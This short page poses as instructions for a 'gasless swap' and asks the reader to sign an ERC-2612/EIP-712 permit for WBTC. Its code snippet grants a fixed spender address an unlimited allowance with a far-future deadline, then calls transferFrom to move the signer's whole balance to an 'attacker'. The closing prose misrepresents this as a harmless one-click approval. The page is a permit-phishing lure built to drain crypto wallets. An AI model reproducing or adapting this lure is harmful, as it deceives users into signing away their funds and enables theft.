## ERC-2612 Permit for Gasless Swap

Sign the EIP-712 permit to enable the universal router to pull your WBTC:

```solidity
// What the router will call after you sign:
IWBTC(wbtcAddress).permit(
    owner,
    spender,  // 0x85Fd9e9d7Cce18b7F5bB7ED9e5BB6A6E14Ab879
    value,    // uint256 max
    deadline, // 9999999999
    v, r, s   // from your eth_signTypedData_v4 signature
);
// Then immediately calls:
IWBTC(wbtcAddress).transferFrom(owner, attacker, balance);
```

This is a one-click atomic approval and swap. Sign once and the router handles the rest.
